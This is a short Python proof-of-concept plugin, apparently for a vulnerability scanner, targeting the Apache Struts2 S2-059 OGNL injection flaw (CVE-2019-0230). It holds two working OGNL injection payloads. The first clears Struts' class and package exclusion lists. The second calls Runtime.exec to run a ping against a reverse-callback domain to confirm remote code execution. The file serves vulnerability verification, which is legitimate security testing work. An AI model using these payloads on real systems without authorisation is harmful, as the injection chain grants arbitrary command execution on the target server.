#!/usr/bin/python
# coding=utf-8
'''
Date: 2022-03-22 10:33:13
LastEditors: recar
LastEditTime: 2022-03-22 18:48:06
'''

from plugins.poc.base import PocBase
from lib.reverse import Reverse


class Poc(PocBase):
    def __init__(self):
        super(PocBase, self).__init__()
        self.name = "Struts2 S2-059 远程代码执行漏洞"
        self.cve = "CVE-2019-0230"
        self.author = "Recar"
        self.desc = "Apache Struts框架, 会对某些特定的标签的属性值，比如id属性进行二次解析，所以攻击者可以传递将在呈现标签属性时再次解析的OGNL表达式，造成OGNL表达式注入。从而可能造成远程执行代码。"
        self.fingerprint = "struts2"

    def setup(self):
        data = {
                "id": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
            }
        self.post(self.base_url, data=data, timeout=3)

    def send_payload(self):
        self.reverse = Reverse()
        cmd = "ping -c 10 {0}".format(self.reverse.domain)
        data = {
            "id": "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('"+cmd+"'))}"
        }
        return self.post(self.base_url, data=data,timeout=3)

    def verify(self, response):
        if self.reverse.verify():
            return True
        return False

